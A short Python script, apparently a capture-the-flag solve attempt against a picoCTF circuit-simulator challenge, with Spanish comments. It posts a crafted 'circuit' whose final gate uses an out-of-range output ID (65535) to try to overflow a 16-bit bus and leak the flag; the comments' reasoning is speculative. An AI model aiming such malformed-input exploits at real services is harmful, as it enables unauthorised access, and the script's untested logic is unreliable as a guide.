import requests

# Este payload intenta saturar el bus de direcciones para que el simulador 
# lea una dirección de memoria donde el registro de 'flag' esté guardado.
# Esto es más estable que inyectar código binario.
circuit = [
    # Mantenemos las puertas NOT para pasar la validación inicial
    {"input1": 5, "input2": 5, "output": 1},
    {"input1": 6, "input2": 6, "output": 2},
    {"input1": 7, "input2": 7, "output": 3},
    {"input1": 8, "input2": 8, "output": 4},
    
    # "Bomba lógica": Usamos nodos de salida fuera de rango que al desbordar
    # el bus de 16 bits (65535+1) mapeen directamente al bit 255 de la bandera.
    # El ID 65535 es el máximo; intentamos forzar el bit 255 mediante un corto.
    {"input1": 1, "input2": 2, "output": 65535} 
]

url = "http://activist-birds.picoctf.net:61158/check"
response = requests.post(url, json={"circuit": circuit})

print(response.json())
